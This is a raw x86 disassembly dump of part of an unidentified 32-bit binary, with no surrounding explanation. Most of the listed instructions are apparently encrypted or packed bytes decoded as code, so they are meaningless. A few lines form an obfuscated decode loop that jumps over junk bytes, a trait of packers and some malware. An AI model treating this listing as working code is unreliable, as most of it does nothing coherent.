  4059f4:	sbb    al,0xb9
  4059f6:	gs sysexit 
  4059f9:	out    0xa3,eax
  4059fb:	add    ecx,DWORD PTR [edx+0x7d]
  4059fe:	div    DWORD PTR [esi+0x2924e123]
  405a04:	loop   0x405a19
  405a06:	add    dl,BYTE PTR [esi-0x47a415b]
  405a0c:	es push ebp
  405a0e:	pop    edx
  405a0f:	jg     0x405a12
  405a11:	mov    dh,0xd0
  405a13:	sub    BYTE PTR [ecx+0x72],bh
  405a16:	push   cs
  405a17:	push   cs
  405a18:	ficomp DWORD PTR [di-0xc]
  405a1c:	xor    eax,0x54b527ac
  405a21:	imul   ebx,ebp,0x62
  405a24:	inc    edx
  405a25:	jp     0x405a95
  405a27:	mov    gs,esi
  405a29:	cdq    
  405a2a:	test   DWORD PTR [edx],ecx
  405a2c:	jecxz  0x405a2e
  405a2e:	cli    
  405a2f:	ficomp DWORD PTR [edx+0x69333cd]
  405a35:	adc    DWORD PTR [esi+ecx*2-0x79],esi
  405a39:	push   ecx
  405a3a:	cmp    dh,dh
  405a3c:	or     dh,al
  405a3e:	aam    0x3e
  405a40:	add    ebp,DWORD PTR [edx-0x4]
  405a43:	out    dx,eax
  405a44:	push   cs
  405a45:	shl    BYTE PTR [edx+0x7151fcc3],cl
  405a4b:	retf   
  405a4c:	xor    eax,0xb180c7b6
  405a51:	popf   
  405a52:	shr    DWORD PTR [ecx+ebx*1],cl
  405a55:	add    eax,0xa463732c
  405a5a:	pop    eax
  405a5b:	sbb    al,0x9b
  405a5d:	shl    DWORD PTR [ebp-0x79b1f2d],1
  405a63:	retf   
  405a64:	xchg   ah,dl
  405a66:	jecxz  0x405a6c
  405a68:	cli    
  405a69:	xchg   ebx,eax
  405a6a:	lock inc esi
  405a6c:	xchg   BYTE PTR [edi],al
  405a6e:	cmp    ebp,DWORD PTR [eax+ebx*2]
  405a71:	aaa    
  405a72:	bnd ja 0x405aab
  405a75:	push   ecx
  405a76:	std    
  405a77:	shl    DWORD PTR [ecx],1
  405a79:	in     al,0xb1
  405a7b:	out    0x8c,eax
  405a7d:	jno    0x405a47
  405a7f:	sbb    BYTE PTR [edi],0xa1
  405a82:	xor    eax,0x6f87e100
  405a87:	(bad)  
  405a88:	not    BYTE PTR [eax+0x2f505c16]
  405a8e:	dec    eax
  405a8f:	ins    DWORD PTR es:[edi],dx
  405a90:	out    dx,al
  405a91:	xlat   BYTE PTR ds:[ebx]
  405a92:	jg     0x405a9e
  405a94:	lods   eax,DWORD PTR ds:[esi]
  405a95:	sbb    al,0x61
  405a97:	rcr    BYTE PTR [ebx],1
  405a99:	inc    ebp
  405a9a:	test   DWORD PTR [eax],edi
  405a9c:	dec    ebx
  405a9d:	push   es
  405a9e:	or     eax,0xc655b9fb
  405aa3:	push   edx
  405aa4:	call   0x2e44199b
  405aa9:	js     0x405ab9
  405aab:	scas   al,BYTE PTR es:[edi]
  405aac:	push   esp
  405aad:	inc    ebp
  405aae:	jmp    esi
  405ab0:	in     eax,dx
  405ab1:	pop    edx
  405ab2:	mov    edx,DWORD PTR [ecx]
  405ab4:	ficom  DWORD PTR [esp+edx*4+0x6d]
  405ab8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ab9:	sub    dh,BYTE PTR [ecx]
  405abb:	lahf   
  405abc:	xor    DWORD PTR [eax],eax
  405abe:	into   
  405abf:	and    esi,esp
  405ac1:	dec    esp
  405ac2:	popf   
  405ac3:	sub    cl,BYTE PTR [ebp+0x770b9fc8]
  405ac9:	jo     0x405ab3
  405acb:	inc    ebx
  405acc:	inc    esi
  405acd:	fisubr WORD PTR [ebp-0xd]
  405ad0:	clc    
  405ad1:	or     cl,bl
  405ad3:	jp     0x405a74
  405ad5:	adc    al,bh
  405ad7:	bound  esi,QWORD PTR [esi]
  405ad9:	nop
  405ada:	call   0xa7c3:0x38a97e2b
  405ae1:	aad    0x18
  405ae3:	adc    DWORD PTR ds:0x653409fb,eax
  405ae9:	jnp    0x405ac6
  405aeb:	jg     0x405b5e
  405aed:	mov    cl,0x80
  405aef:	test   BYTE PTR ds:[edx],cl
  405af2:	outs   dx,DWORD PTR ds:[esi]
  405af3:	jbe    0x405b08
  405af5:	fucomi st,st(6)
  405af7:	or     edi,ebx
  405af9:	xlat   BYTE PTR ds:[ebx]
  405afa:	ins    DWORD PTR es:[edi],dx
  405afb:	or     DWORD PTR [ebp-0x73],eax
  405afe:	jb     0x405b1c
  405b00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b01:	mov    ebx,0x755708a7
  405b06:	dec    ebp
  405b07:	mov    WORD PTR [eax+0x4dd8f678],ss
  405b0d:	adc    ebx,DWORD PTR [ebx+0x4efe63ab]
  405b13:	xor    al,0xab
  405b15:	scas   eax,DWORD PTR es:[edi]
  405b16:	test   eax,0x5b0a5c16
  405b1b:	loopne 0x405b4b
  405b1d:	in     al,0x4c
  405b1f:	jmp    0x405aed
  405b21:	sbb    al,0x75
  405b23:	and    DWORD PTR [edi+0x15],edi
  405b26:	ds addr16 cli 
  405b29:	sbb    esi,0x8f74dac6
  405b2f:	lods   al,BYTE PTR ds:[esi]
  405b30:	sbb    DWORD PTR cs:[edi],eax
  405b33:	or     eax,DWORD PTR es:[eax+ecx*4]
  405b37:	popf   
  405b38:	xchg   ebx,eax
  405b39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405b3a:	push   ecx
  405b3b:	(bad)  
  405b3c:	fsubr  DWORD PTR [eax+0x3b]
  405b3f:	xor    al,0x44
  405b41:	push   esp
  405b42:	xor    cl,BYTE PTR [esi]
  405b44:	dec    ecx
  405b45:	jmp    0xe80d:0xb195474e
  405b4c:	mov    ah,0x65
  405b4e:	ins    BYTE PTR es:[edi],dx
  405b4f:	xchg   BYTE PTR [eax-0x70],al
  405b52:	arpl   dx,dx
  405b54:	in     eax,0x7a
  405b56:	js     0x405b9f
  405b58:	push   edx
  405b59:	rep ins DWORD PTR es:[edi],dx
  405b5b:	lods   eax,DWORD PTR ds:[esi]
  405b5c:	enter  0x6aff,0x21
  405b60:	in     eax,0x75
  405b62:	and    cl,BYTE PTR [eax]
  405b64:	mov    ebp,0xbdfcb015
  405b69:	lahf   
  405b6a:	(bad)  
  405b6b:	std    
  405b6c:	push   0xeb89ccfb
  405b71:	in     eax,dx
  405b72:	add    eax,0x681437d
  405b77:	mov    al,ds:0x8840309a
  405b7c:	mov    eax,0x93fc5473
  405b81:	pop    ds
  405b82:	cs retf 
  405b84:	add    eax,0x5d62bcc
  405b89:	in     eax,0x44
  405b8b:	js     0x405b98
  405b8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405b8e:	imul   eax,DWORD PTR es:0x9b1872c8,0xffffffa6
  405b96:	xor    edi,DWORD PTR [edi+0x33a8f920]
  405b9c:	aam    0x58
  405b9e:	add    ecx,DWORD PTR [ecx]
  405ba0:	xchg   ebp,eax
  405ba1:	pop    ss
  405ba2:	or     al,BYTE PTR [ecx+0x6b]
  405ba5:	enter  0x794a,0x2e
  405ba9:	outs   dx,DWORD PTR ds:[esi]
  405baa:	inc    esi
  405bab:	push   ebp
  405bac:	mov    bh,0xe9
  405bae:	xor    eax,0x6db925c3
  405bb3:	dec    esp
  405bb4:	cdq    
  405bb5:	pop    esp
  405bb6:	sub    BYTE PTR [edx+edi*1-0x366e6734],0x3
  405bbe:	dec    ebp
  405bbf:	sbb    ebx,DWORD PTR [ebp-0x64]
  405bc2:	pop    edi
  405bc3:	or     ebp,DWORD PTR [ebp-0x7afe918f]
  405bc9:	cld    
  405bca:	fcomp  st(4)
  405bcc:	lock addr16 dec edi
  405bcf:	mov    edi,0x5b7065f2
  405bd4:	mov    ch,dl
  405bd6:	dec    edx
  405bd7:	and    dh,dl
  405bd9:	ja     0x405b6d
  405bdb:	stc    
  405bdc:	mov    esi,0x2c5b5508
  405be1:	ins    DWORD PTR es:[edi],dx
  405be2:	add    BYTE PTR [esi],cl
  405be4:	push   cs
  405be5:	sbb    al,0xed
  405be7:	adc    al,0x96
  405be9:	xchg   edi,eax
  405bea:	jge    0x405be8
  405bec:	fld    QWORD PTR [ebx-0x3f4d3b28]
  405bf2:	enter  0x2d9a,0xe2
  405bf6:	test   DWORD PTR [ebx+esi*4+0x73],ecx
  405bfa:	out    dx,eax
  405bfb:	call   0xe3f01474
  405c00:	jo     0x405bd1
  405c02:	mov    al,ds:0x698fc72
  405c07:	mov    esi,edx
  405c09:	test   eax,0xe3577bc3
  405c0e:	inc    esi
  405c0f:	sub    edi,eax
  405c11:	add    edi,DWORD PTR [ebp+0x10]
  405c14:	xor    edx,ecx
  405c16:	add    edx,esi
  405c18:	cmp    edx,edi
  405c1a:	ja     0x406428
  405c20:	push   ebx
  405c21:	jmp    0x405c2b
  405c26:	mov    esi,0x32729d
  405c2b:	mov    eax,DWORD PTR [ebp-0x8]
  405c2e:	mov    edi,DWORD PTR [ebp-0x4]
  405c31:	xor    edi,ecx
  405c33:	jmp    0x40600f
  405c38:	test   DWORD PTR [edx-0x7c],0x79ec5dea
  405c3f:	arpl   WORD PTR ds:0x495d0ed0,dx
  405c45:	or     cl,ah
  405c47:	rcl    DWORD PTR [eax+0x3b],0x7e
  405c4b:	jle    0x405c0a
  405c4d:	jno    0x405ccd
  405c4f:	jle    0x405c98
  405c51:	bound  ecx,QWORD PTR [esi-0x6a]
  405c54:	mov    ebx,0x81780621
  405c59:	dec    esp
  405c5a:	xchg   ch,ah
  405c5c:	mov    ecx,0x19f8bddc
  405c61:	ror    DWORD PTR [eax-0x44533471],1
  405c67:	(bad)  
  405c69:	aad    0x4
  405c6b:	aam    0x38
  405c6d:	mov    dl,0xde
  405c6f:	lea    ecx,[eax-0x10fae578]
  405c75:	xchg   DWORD PTR [edi+ecx*2-0x4bcab53],ebp
  405c7c:	add    dh,BYTE PTR [esi+0x4ee03183]
  405c82:	jge    0x405c34
  405c84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405c85:	pop    es
  405c86:	and    DWORD PTR [ebp+0x24fe73b2],ebx
  405c8c:	inc    ecx
  405c8d:	push   eax
  405c8e:	push   0x138eaf42
  405c93:	les    ebp,FWORD PTR [eax]
  405c95:	cs pop edi
  405c97:	int3   
  405c98:	add    ebp,edi
  405c9a:	push   eax
  405c9b:	es stc 
  405c9d:	scas   eax,DWORD PTR es:[edi]
  405c9e:	enter  0xef2e,0x67
  405ca2:	xor    eax,0xcdefda79
  405ca7:	sar    DWORD PTR [ecx+0x68a6eed3],1
  405cad:	into   
  405cae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405caf:	push   0xffffffcc
  405cb1:	into   
  405cb2:	aaa    
  405cb3:	ss sbb eax,0x15b90add
  405cb9:	in     eax,0x4d
  405cbb:	cli    
  405cbc:	mov    eax,0x60c2e3fb
  405cc1:	test   dl,ah
  405cc3:	or     al,0xa9
  405cc5:	push   ss
  405cc6:	(bad)  
  405cc7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405cc8:	jne    0x405d05
  405cca:	aad    0x94
  405ccc:	and    bl,dl
  405cce:	mov    DWORD PTR [ebp-0x36],ebx
  405cd1:	mov    eax,0xbbad4d6a
  405cd6:	mov    eax,ds:0x63a531d3
  405cdb:	jno    0x405ca3
  405cdd:	pop    ebp
  405cde:	pop    edx
  405cdf:	clc    
  405ce0:	ins    DWORD PTR es:[edi],dx
  405ce1:	pop    ebp
  405ce2:	pop    edx
  405ce3:	push   eax
  405ce4:	test   DWORD PTR [edx],edi
  405ce6:	mov    dl,0xc5
  405ce8:	ret    
  405ce9:	mov    ah,0x26
  405ceb:	jle    0x405c9c
  405ced:	leave  
  405cee:	sbb    eax,0xde290208
  405cf3:	pop    ebx
  405cf4:	xchg   edx,eax
  405cf5:	pop    ecx
  405cf6:	call   0xa66c:0x41c6cf29
  405cfd:	jecxz  0x405d61
  405cff:	jb     0x405cbd
  405d01:	aam    0x5
  405d03:	mov    al,0x94
  405d05:	gs (bad) 
  405d07:	int3   
  405d08:	fild   DWORD PTR [edx+0x47eba034]
  405d0e:	maskmovq mm3,(bad)
  405d0f:	neg    DWORD PTR [ebp+0x7c44dcb4]
  405d15:	(bad)  
  405d16:	sub    dl,BYTE PTR [ecx-0x51]
  405d19:	dec    ebx
  405d1a:	xor    eax,0x13ca2421
  405d1f:	nop
  405d20:	mov    ch,BYTE PTR [esi]
  405d22:	push   es
  405d23:	repz or BYTE PTR [eax+0x78],0x1a
  405d28:	mov    ds:0x22466c50,eax
  405d2d:	pmaxub mm4,mm5
  405d30:	push   es
  405d31:	scas   eax,DWORD PTR es:[edi]
  405d32:	xchg   eax,eax
  405d34:	mov    eax,0xee7dcb74
  405d39:	xchg   ebp,eax
  405d3a:	les    ebx,FWORD PTR ds:0x383ea726
  405d40:	fcomip st,st(2)
  405d42:	outs   dx,BYTE PTR ds:[esi]
  405d43:	ja     0x405d0c
  405d45:	ja     0x405d76
  405d47:	sbb    eax,0x4d97457d
  405d4c:	retf   
  405d4d:	xchg   DWORD PTR [edi+0x47124f9d],edx
  405d53:	cs aad 0x2f
  405d56:	push   edx
  405d57:	push   esi
  405d58:	push   esp
  405d59:	loopne 0x405cf8
  405d5b:	out    0xde,al
  405d5d:	sub    eax,0x846d12a3
  405d62:	xlat   BYTE PTR ds:[ebx]
  405d63:	pushf  
  405d64:	repnz mov ah,0x5e
  405d67:	cdq    
  405d68:	push   esi
  405d69:	stos   DWORD PTR es:[edi],eax
  405d6a:	push   es
  405d6b:	push   esp
  405d6c:	mov    ecx,DWORD PTR ds:0xe410140d
  405d72:	mov    dh,BYTE PTR [ecx]
  405d74:	(bad)  
  405d76:	mov    dl,0x73
  405d78:	xchg   BYTE PTR [ebx+0x6],dh
  405d7b:	xor    ebx,ebx
  405d7d:	dec    edi
  405d7e:	dec    eax
  405d7f:	or     al,0x25
  405d81:	in     eax,dx
  405d82:	mov    eax,ds:0x26002479
  405d87:	fwait
  405d88:	enter  0x50cb,0x33
  405d8c:	ja     0x405dc6
  405d8e:	mov    eax,0xffcbecb3
  405d93:	dec    esp
  405d94:	js     0x405de0
  405d96:	add    DWORD PTR [ecx],eax
  405d98:	cmp    eax,0x70bc7dbd
  405d9d:	into   
  405d9e:	sub    eax,0x60df886a
  405da3:	aaa    
  405da4:	ins    DWORD PTR es:[edi],dx
  405da5:	scas   al,BYTE PTR es:[edi]
  405da6:	dec    edx
  405da7:	mov    esp,0xe46c2323
  405dac:	lds    esi,FWORD PTR [ecx+0x69]
  405daf:	mov    ebp,0xf559a613
  405db4:	loop   0x405dd0
  405db6:	xchg   esp,eax
  405db7:	ret    
  405db8:	add    al,0xc0
  405dba:	sub    dh,cl
  405dbc:	xchg   esp,eax
  405dbd:	out    dx,eax
  405dbe:	jae    0x405e2c
  405dc0:	add    bh,0x26
  405dc3:	aad    0xa0
  405dc5:	ja     0x405de4
  405dc7:	retf   
  405dc8:	xor    edx,esi
  405dca:	jecxz  0x405e40
  405dcc:	adc    ebx,0xc20d01c6
  405dd2:	mov    ch,cl
  405dd4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405dd5:	xlat   BYTE PTR ds:[ebx]
  405dd6:	out    0xf3,eax
  405dd8:	cmp    ch,BYTE PTR [ebx+0x36]
  405ddb:	neg    BYTE PTR [ecx-0x7f604a51]
  405de1:	lds    esi,FWORD PTR [ecx]
  405de3:	ret    
  405de4:	push   ds
  405de5:	jge    0x405dec
  405de7:	pop    eax
  405de8:	pop    es
  405de9:	jmp    0x1667975a
  405dee:	scas   al,BYTE PTR es:[edi]
  405def:	aam    0x1c
  405df1:	sar    ebx,1
  405df3:	push   esi
  405df4:	push   esp
  405df5:	(bad)  
  405df6:	scas   eax,DWORD PTR es:[edi]
  405df7:	out    0x2c,al
  405df9:	pop    eax
  405dfa:	push   esp
  405dfb:	xchg   ecx,eax
  405dfc:	enter  0xf014,0xbe
  405e00:	retf   
  405e01:	lahf   
  405e02:	inc    edx
  405e03:	mov    dh,0xcf
  405e05:	inc    edx
  405e06:	rcl    DWORD PTR ds:0x464e8282,1
  405e0c:	mov    gs,WORD PTR [ecx+0x51]
  405e0f:	in     al,0xdd
  405e11:	mov    esp,0xfa358216
  405e16:	cdq    
  405e17:	cmp    al,0xe0
  405e19:	sar    DWORD PTR [ecx],cl
  405e1b:	inc    edi
  405e1c:	push   edx
  405e1d:	mov    BYTE PTR [ebp+0x4a],bh
  405e20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e21:	(bad)  
  405e22:	pop    esi
  405e23:	xor    ebp,DWORD PTR [edx]
  405e25:	movntq QWORD PTR [ebx],mm4
  405e28:	das    
  405e29:	jnp    0x405de0
  405e2b:	jmp    0x405e25
  405e2d:	inc    edx
  405e2e:	rcl    BYTE PTR [ecx],cl
  405e30:	out    0x70,eax
  405e32:	inc    esp
  405e33:	(bad)  [ecx-0x6616b228]
  405e39:	mov    ecx,0x13b4a767
  405e3e:	out    dx,al
  405e3f:	dec    edi
  405e40:	pop    edx
  405e41:	div    DWORD PTR [esi+edi*8+0x23385b3d]
  405e48:	and    ebp,edx
  405e4a:	in     al,0x47
  405e4c:	(bad)  
  405e4d:	dec    ecx
  405e4e:	cmp    al,0x22
  405e50:	cdq    
  405e51:	js     0x405e2c
  405e53:	test   al,0x6f
  405e55:	dec    edi
  405e56:	imul   eax,DWORD PTR [edi+0x4d2121eb],0xffffffe3
  405e5d:	sub    dl,BYTE PTR [ebp+0x44c910e1]
  405e63:	xchg   DWORD PTR [eax],ebp
  405e65:	xchg   edx,eax
  405e66:	jg     0x405e64
  405e68:	pop    es
  405e69:	loopne 0x405e54
  405e6b:	fwait
  405e6c:	jb     0x405dff
  405e6e:	mov    esi,0xf020db2
  405e73:	and    ebp,DWORD PTR [eax-0x31]
  405e76:	in     eax,dx
  405e77:	dec    edi
  405e78:	gs xor al,0xd7
  405e7b:	mov    al,0x55
  405e7d:	lock or BYTE PTR [esi-0x72],0x8b
  405e82:	icebp  
  405e83:	or     BYTE PTR [edi+ebx*8+0x236b4153],0x14
  405e8b:	rcr    ebx,0xf6
  405e8e:	pop    ecx
  405e8f:	jbe    0x405f03
  405e91:	out    dx,eax
  405e92:	dec    eax
  405e93:	push   ds
  405e94:	adc    BYTE PTR [eax-0x38],bl
  405e97:	pusha  
  405e98:	mov    edi,0xd9caa5ac
  405e9d:	out    dx,al
  405e9e:	or     bl,0x3e
  405ea1:	mov    ch,0x1c
  405ea3:	or     BYTE PTR [esi+0xdfe39e9],cl
  405ea9:	nop
  405eaa:	mov    cl,0x6c
  405eac:	popa   
  405ead:	ret    
  405eae:	js     0x405e77
  405eb0:	pop    edi
  405eb1:	mov    ds:0x95a5be2,eax
  405eb6:	ins    BYTE PTR es:[edi],dx
  405eb7:	xchg   edx,eax
  405eb8:	sub    eax,0x1da4b662
  405ebd:	in     ax,0xd5
  405ec0:	ja     0x405e4b
  405ec2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ec3:	pop    edx
  405ec4:	inc    edi
  405ec5:	mov    cl,0x13
  405ec7:	lods   al,BYTE PTR ds:[esi]
  405ec8:	repnz xchg esp,eax
  405eca:	and    BYTE PTR [ecx],cl
  405ecc:	pop    esp
  405ecd:	sti    
  405ece:	jecxz  0x405eca
  405ed0:	cmp    edx,0x54b576c9
  405ed6:	pop    es
  405ed7:	push   edi
  405ed8:	clc    
  405ed9:	aad    0x4c
  405edb:	dec    eax
  405edc:	jb     0x405ed4
  405ede:	fwait
  405edf:	lods   eax,DWORD PTR ds:[esi]
  405ee0:	xlat   BYTE PTR ds:[ebx]
  405ee1:	sar    DWORD PTR [ecx+0x1],0x2
  405ee5:	add    bh,BYTE PTR [esi+ecx*4-0xeced537]
  405eec:	lods   al,BYTE PTR ds:[esi]
  405eed:	sahf   
  405eee:	ds test DWORD PTR gs:[ecx],ebx
  405ef2:	jbe    0x405f15
  405ef4:	push   edx
  405ef5:	pop    ds
  405ef6:	mov    ds:0xcc1392fb,al
  405efb:	mov    bh,BYTE PTR [eax]
  405efd:	popf   
  405efe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405eff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f00:	ss pop es
  405f02:	in     eax,dx
  405f03:	scas   al,BYTE PTR es:[edi]
  405f04:	fcmovbe st,st(1)
  405f06:	stc    
  405f07:	rcr    DWORD PTR [ecx+0x3eccb92d],1
  405f0d:	call   0xcdf2:0xa18d740f
  405f14:	in     al,0x6c
  405f16:	mov    ch,BYTE PTR [ebp-0x37]
  405f19:	xchg   edi,eax
  405f1a:	js     0x405eec
  405f1c:	(bad)  
  405f1d:	pop    ecx
  405f1e:	(bad)  
  405f1f:	jns    0x405f94
  405f21:	cmc    
  405f22:	xchg   ebp,eax
  405f23:	dec    eax
  405f24:	pop    ds
  405f25:	lods   al,BYTE PTR ds:[esi]
  405f26:	fldcw  WORD PTR [edi-0x69]
  405f29:	mov    edx,0xfe5aa606
  405f2e:	(bad)  
  405f2f:	ret    
  405f30:	fisubr WORD PTR [ebp+edx*1-0x66c68794]
  405f37:	mov    ah,0xeb
  405f39:	ret    0x8dfe
  405f3c:	out    dx,al
  405f3d:	mov    ds,WORD PTR [edx]
  405f3f:	and    eax,0x730880e3
  405f44:	stos   BYTE PTR es:[edi],al
  405f45:	fcmove st,st(2)
  405f47:	cdq    
  405f48:	jecxz  0x405f7b
  405f4a:	mov    BYTE PTR [eax+0x6a],bl
  405f4d:	and    eax,0x1f873a7
  405f52:	mov    esp,0xd9eb4ea1
  405f57:	inc    eax
  405f58:	cwde   
  405f59:	(bad)  
  405f5a:	push   ds
  405f5b:	call   0x261f5d5d
  405f60:	out    0x48,al
  405f62:	inc    ebx
  405f63:	fmul   DWORD PTR [esi]
  405f65:	ins    BYTE PTR es:[edi],dx
  405f66:	les    edi,FWORD PTR [edx+0x844ba2]
  405f6c:	addr16 jle 0x405fd2
  405f6f:	xchg   DWORD PTR [ecx-0x521284ca],edx
  405f75:	in     eax,dx
  405f76:	xchg   edx,eax
  405f77:	dec    ebp
  405f78:	es retf 
  405f7a:	push   ecx
  405f7b:	(bad)  
  405f7c:	lock push ebx
  405f7e:	les    esi,FWORD PTR [ecx+0x7f]
  405f81:	push   cs
  405f82:	(bad)  
  405f83:	je     0x405f7d
  405f85:	dec    ebp
  405f86:	clc    
  405f87:	int    0x54
  405f89:	out    dx,eax
  405f8a:	sbb    al,0xcc
  405f8c:	ficom  DWORD PTR [ebp+0x2e1a8edd]
  405f92:	xchg   DWORD PTR [edx-0x69f409b2],edi
  405f98:	mov    bl,0xd5
  405f9a:	daa    
  405f9b:	add    eax,0x562f6167
  405fa0:	jnp    0x405fc4
  405fa2:	add    al,0xa1
  405fa4:	jl     0x405f30
  405fa6:	push   0x3f
  405fa8:	xor    al,0x28
  405faa:	clc    
  405fab:	mov    ds:0x6756f24e,al
  405fb0:	cld    
  405fb1:	lods   eax,DWORD PTR ds:[esi]
  405fb2:	(bad)  
  405fb3:	mov    ds:0x80bb8df0,eax
  405fb8:	cmp    BYTE PTR ds:0x237131f8,0xdf
  405fbf:	icebp  
  405fc0:	sbb    DWORD PTR [eax+0x2fbfafae],0xc1d4ba46
  405fca:	popa   
  405fcb:	retf   0x20dd
  405fce:	and    edi,DWORD PTR [eax-0x3472265b]
  405fd4:	gs or  ebx,esp
  405fd7:	pop    ebx
  405fd8:	mov    dh,0x35
  405fda:	mov    esi,0xa09439e5
  405fdf:	je     0x405f6a
  405fe1:	mov    cl,BYTE PTR [edx+0x4d]
  405fe4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405fe5:	stos   DWORD PTR es:[edi],eax
  405fe6:	(bad)  
  405fe7:	mov    cl,0xea
  405fe9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405fea:	ret    0xebe
  405fed:	push   eax
  405fee:	push   ebx
  405fef:	push   edx
  405ff0:	scas   al,BYTE PTR es:[edi]
  405ff1:	xor    dl,BYTE PTR [ecx]
  405ff3:	sbb    ebp,DWORD PTR [ebp-0x6a]
  405ff6:	ins    BYTE PTR es:[edi],dx
  405ff7:	(bad)  
  405ff8:	pop    edx
  405ff9:	in     eax,dx
  405ffa:	lods   al,BYTE PTR ds:[esi]
  405ffb:	in     eax,0xeb
  405ffd:	add    bl,BYTE PTR [esi-0x680c7c64]
  406003:	in     al,0xf9
  406005:	xor    BYTE PTR [ebx+0x18],dl
  406008:	ds ja  0x406002
  40600b:	jp     0x406081
  40600d:	dec    edi
  40600e:	scas   al,BYTE PTR es:[edi]
  40600f:	add    edi,esi
  406011:	mov    esi,DWORD PTR [ebp+0x8]
  406014:	imul   edi,edx
  406017:	mov    ebx,DWORD PTR [ebp+0xc]
  40601a:	xor    eax,ecx
  40601c:	add    eax,edx
  40601e:	mov    al,BYTE PTR [ebx+eax*1+0x32729d]
  406025:	mov    BYTE PTR [edi+esi*1],al
  406028:	mov    eax,DWORD PTR [ebp-0x4]
  40602b:	xor    eax,ecx
  40602d:	lea    edx,[edx+eax*1+0x32729d]
  406034:	mov    eax,DWORD PTR [ebp-0x4]
  406037:	xor    eax,ecx
  406039:	mov    esi,0xffcd8d63
  40603e:	sub    esi,eax
  406040:	add    esi,DWORD PTR [ebp+0x10]
  406043:	cmp    edx,esi
  406045:	jmp    0x406421
  40604a:	fdivr  st(7),st
  40604c:	es fwait
  40604e:	jge    0x40600b
  406050:	jge    0x40609b
  406052:	jae    0x4060cf
  406054:	dec    edx
  406055:	pusha  
  406056:	xchg   esi,eax
  406057:	dec    bl
  406059:	rcr    DWORD PTR [edi-0x428181c1],1
  40605f:	jno    0x4060df
  406061:	jle    0x40602d
  406063:	scas   eax,DWORD PTR es:[edi]
  406064:	outs   dx,DWORD PTR ds:[esi]
  406065:	xchg   ecx,eax
  406066:	mov    al,ds:0x346a4477
  40606b:	sub    DWORD PTR [esi],esp
  40606d:	shr    BYTE PTR [esi-0x7e],1
  406070:	(bad)  
  406071:	jmp    0x1d440b6a
  406076:	aas    
  406077:	or     al,0x89
  406079:	sbb    dl,BYTE PTR [edx]
  40607b:	test   cl,bl
  40607d:	pushf  
  40607e:	xchg   esp,eax
  40607f:	dec    esp
  406080:	sbb    ch,BYTE PTR [edi-0x45d6fd7f]
  406086:	fdivr  QWORD PTR [edx]
  406088:	mov    dh,ch
  40608a:	cmc    
  40608b:	and    dl,BYTE PTR [edx+edx*8+0x9d0a063]
  406092:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406093:	paddq  mm4,QWORD PTR [esi+0x59]
  406097:	ja     0x4060f4
  406099:	in     al,dx
  40609a:	sbb    eax,0x506a8d5f
  40609f:	gs jecxz 0x406070
  4060a2:	xlat   BYTE PTR ds:[ebx]
  4060a3:	mov    esi,0x6613b208
  4060a8:	outs   dx,DWORD PTR ds:[esi]
  4060a9:	jmp    0xa7711e66
  4060ae:	xor    dl,BYTE PTR [edx-0x7d]
  4060b1:	lock aam 0x6d
  4060b4:	aaa    
  4060b5:	push   esi
  4060b6:	test   BYTE PTR [ebp-0x5],dl
  4060b9:	iret   
  4060ba:	or     DWORD PTR [ebx],ebx
  4060bc:	sbb    DWORD PTR [ebp-0x77],ebp
  4060bf:	mov    eax,ds:0x118f3d8e
  4060c4:	mov    bh,0x1d
  4060c6:	add    BYTE PTR [eax+0x44],bl
  4060c9:	test   al,0xfe
  4060cb:	cmp    eax,0x86896875
  4060d0:	ja     0x406149
  4060d2:	xchg   edi,eax
  4060d3:	out    dx,al
  4060d4:	lds    esp,FWORD PTR [ebx-0x52fa0d5]
  4060da:	inc    ebp
  4060db:	xchg   esp,eax
  4060dc:	inc    edi
  4060dd:	out    dx,al
  4060de:	daa    
  4060df:	mov    ds:0x61e95ad,al
  4060e4:	(bad)  
  4060e5:	fdiv   DWORD PTR [edi-0x61]
  4060e8:	xor    ebp,DWORD PTR [edx]
  4060ea:	iret   
  4060eb:	adc    al,0x4f
  4060ed:	test   DWORD PTR [esi],edx
  4060ef:	stos   BYTE PTR es:[edi],al
  4060f0:	adc    al,0x24
  4060f2:	loop   0x4060ed
  4060f4:	add    bl,BYTE PTR [edx+0x39]
  4060f7:	ss cmc 
  4060f9:	xor    ecx,DWORD PTR [edi+0x36]
  4060fc:	xchg   esi,eax
  4060fd:	sub    ch,BYTE PTR [ebx]
  4060ff:	fmul   DWORD PTR [ebp+eax*1-0x40]
  406103:	fild   DWORD PTR [eax-0x24469a23]
  406109:	not    ah
  40610b:	ds jecxz 0x4060c1
  40610e:	dec    ebx
  40610f:	mov    edi,0xe6648da5
  406114:	stos   BYTE PTR es:[edi],al
  406115:	xchg   DWORD PTR [ecx+0x36df3597],ebp
  40611b:	(bad)  
  40611c:	(bad)  
  40611d:	mov    dh,0x3a
  40611f:	pop    ds
  406120:	popf   
  406121:	pop    ecx
  406122:	xchg   esp,eax
  406123:	mov    esi,DWORD PTR ds:0xeaa73819
  406129:	jns    0x406142
  40612b:	out    0xaa,eax
  40612d:	mov    es,WORD PTR [ecx]
  40612f:	repnz pop cx
  406132:	fbld   TBYTE PTR [edi]
  406134:	pop    ss
  406135:	mov    ebx,0xe7ed46d7
  40613a:	in     eax,0xc9
  40613c:	test   ch,dl
  40613e:	pop    ss
  40613f:	xchg   ebp,eax
  406140:	ins    BYTE PTR es:[edi],dx
  406141:	jno    0x40616e
  406143:	test   eax,0x9c945376
  406149:	xchg   ecx,eax
  40614a:	and    ch,dl
  40614c:	std    
  40614d:	xchg   esp,eax
  40614e:	mov    al,0xd1
  406150:	cmp    esi,DWORD PTR [eax-0x57]
  406153:	pop    ebx
